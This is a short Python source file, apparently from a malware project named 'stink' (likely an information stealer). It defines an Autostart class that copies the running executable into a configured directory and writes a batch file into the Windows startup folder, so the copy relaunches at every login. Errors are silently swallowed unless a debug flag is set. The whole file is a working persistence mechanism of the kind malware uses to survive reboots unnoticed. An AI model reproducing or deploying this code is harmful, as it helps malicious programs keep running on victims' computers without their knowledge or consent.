from shutil import copyfile

from stink.helpers.config import AutostartConfig


class Autostart:

    def __init__(self, executor_path: str, errors: bool):

        self.__executor_path = executor_path
        self.__errors = errors

        self.__config = AutostartConfig()

    def __create_copy(self):

        self.executor_name = self.__executor_path.replace("\\", "/").split("/")[-1]
        copyfile(self.__executor_path, rf"{self.__config.ExecutorPath}\{self.executor_name}")

    def __add_to_autostart(self):

        with open(rf"{self.__config.AutostartPath}\{self.__config.AutostartName}.bat", "w+") as file:
            file.write(f'@echo off\nstart "{self.__config.AutostartName}" "{self.__config.ExecutorPath}\\{self.executor_name}"')

    def run(self):

        try:

            self.__create_copy()
            self.__add_to_autostart()

        except Exception as e:
            if self.__errors is True: print(f"[Autostart]: {repr(e)}")
